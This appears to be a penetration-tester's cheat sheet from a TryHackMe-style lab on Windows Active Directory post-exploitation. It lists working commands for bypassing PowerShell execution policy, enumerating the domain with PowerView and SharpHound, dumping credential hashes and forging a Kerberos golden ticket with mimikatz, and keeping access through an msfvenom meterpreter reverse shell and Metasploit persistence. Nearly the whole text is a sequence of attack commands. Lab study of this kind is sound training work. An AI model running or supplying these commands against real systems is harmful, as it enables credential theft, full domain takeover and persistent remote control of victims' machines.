# Windows
## Powerview
Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.
1.) Start Powershell - `powershell -ep bypass` -ep bypasses the execution policy of powershell allowing you to easily run scripts
2.) Start PowerView - `. .\Downloads\PowerView.ps1`

3.) Enumerate the domain users - `Get-NetUser | select cn`. `select` get the supplied field only because Get-NetUser have a shitload of output. cn is the name, canonical name i guess.
4.) Enumerate the domain groups - `Get-NetGroup -GroupName *admin*`

`Invoke-Sharefinder`: show all shared folder(SMB)

Cheatsheet:
For 2.0 https://gist.github.com/HarmJ0y/3328d954607d71362e3c
3.0 https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

## Bloodhound
Bloodhound is a graphical interface that allows you to visually map out the network.
First get loot from the compromised host with Sharphound:
1.) `powershell -ep bypass` same as with PowerView

2.) `. .\Downloads\SharpHound.ps1`    

3.) `Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip`

Transfer the loot to the attacker machine.
extract it and drop on `bloodhound` with: neo4j:password

## mimikatz
### Dumping hash
1.) execute mimikatz.exe
2.) `privilege::debug` ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly
3.) `lsadump::lsa /patch` Dump those hashes!
### golden ticket
 1.) `cd downloads && mimikatz.exe`    

2.) `privilege::debug` ensure this outputs \[privilege "20" ok]

 3.) `lsadump::lsa /inject /name:krbtgt`  This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket(krbtgt is a kerberoastable account)

 Create the golden ticket with
 `kerberos::golden /user:USER /domain: /sid:SID /krbtgt:NTLMHASH /id:ID`
 where USER is your currently accessible user,
 SID and NTLMHASH is from the command before(SID is located on the domain field as Domain: DOMAIN_NAME / SID) 
 ID is USER id.

 Use the golden ticket to access other machine with:
 1.) `misc::cmd` - This will open a new command prompt with elevated privileges to all machines
 2.) Access other Machines! - You will now have another command prompt with access to all other machines on the network

 ## maintaining access
 create a msfvenom reverse shell:
 1.) `msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe` this will generate a basic windows meterpreter reverse tcp shell
 2.) use multi handler with `use exploit/multi/handler`
 3.) Configure our payload to be a windows meterpreter shell: `set payload windows/meterpreter/reverse_tcp`
 4.) After setting your THM IP address as your "LHOST", start the listener with `run`
 with the session in background `use exploit/windows/local/persistence`, by default it will send shell every 10 second, but you can adjust it

 Resources -

-   [https://blog.harmj0y.net/](https://blog.harmj0y.net/)[](https://blog.harmj0y.net/)
-   [https://adsecurity.org/?page_id=1821](https://adsecurity.org/?page_id=1821)[](https://adsecurity.org/?page_id=1821)
-   [https://metasploit.help.rapid7.com/docs/about-post-exploitation](https://metasploit.help.rapid7.com/docs/about-post-exploitation)  
    
-   [http://www.pentest-standard.org/index.php/Post_Exploitation](http://www.pentest-standard.org/index.php/Post_Exploitation)
-   [https://offsec.red/mimikatz-cheat-sheet/](https://offsec.red/mimikatz-cheat-sheet/)[](https://offsec.red/mimikatz-cheat-sheet/)
-   [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)[](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

Tools/Malware Used -

-   [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)[](https://github.com/gentilkiwi/mimikatz)
-   [https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1)[](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1)
-   [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)